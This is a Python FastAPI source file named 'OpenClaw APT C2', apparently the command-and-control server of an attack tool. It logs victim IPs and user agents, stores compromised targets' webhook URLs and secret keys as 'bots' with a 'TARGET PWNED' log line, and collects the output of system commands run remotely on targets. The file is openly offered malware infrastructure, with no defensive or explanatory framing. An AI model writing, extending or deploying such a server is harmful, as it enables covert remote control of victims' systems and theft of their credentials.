import logging
from fastapi import FastAPI, Request, Header
import uvicorn
import threading
from core.bot_db import save_bot, log_telemetry, ASYNC_RESULTS

app = FastAPI(title="OpenClaw APT C2")

@app.get("/telemetry")
async def receive_telemetry(request: Request, user_agent: str = Header(None)):
    client_ip = request.client.host
    log_telemetry(client_ip, user_agent or "Unknown")
    return {"status": "ok"}

@app.post("/hook")
async def receive_hook(request: Request):
    try:
        data = await request.json()
    except: return {"status": "error"}

    target_id = data.get("target_id", f"target_{threading.get_ident()}")
    webhook_url = data.get("webhook_url")
    secret_key = data.get("secret_key")
    
    if webhook_url and secret_key:
        save_bot(target_id, webhook_url, secret_key, data.get("metadata", {}))
        logging.getLogger("uvicorn.error").warning(f"\n[C2] TARGET PWNED: {target_id} \n")
        return {"status": "roger"}
    return {"status": "failed"}

@app.post("/report")
async def receive_report(request: Request):
    """接收 OpenClaw 异步执行系统命令后的 Stdout 回传"""
    try:
        data = await request.json()
        target_id = data.get("target_id")
        output = data.get("output", "")
        if target_id:
            ASYNC_RESULTS[target_id] = output
            return {"status": "acknowledged"}
    except: pass
    return {"status": "error"}

def start_c2_server(host: str = "0.0.0.0", port: int = 8000):
    def run():
        logging.getLogger("uvicorn.access").setLevel(logging.WARNING)
        uvicorn.run(app, host=host, port=port, log_level="warning")
    threading.Thread(target=run, daemon=True).start()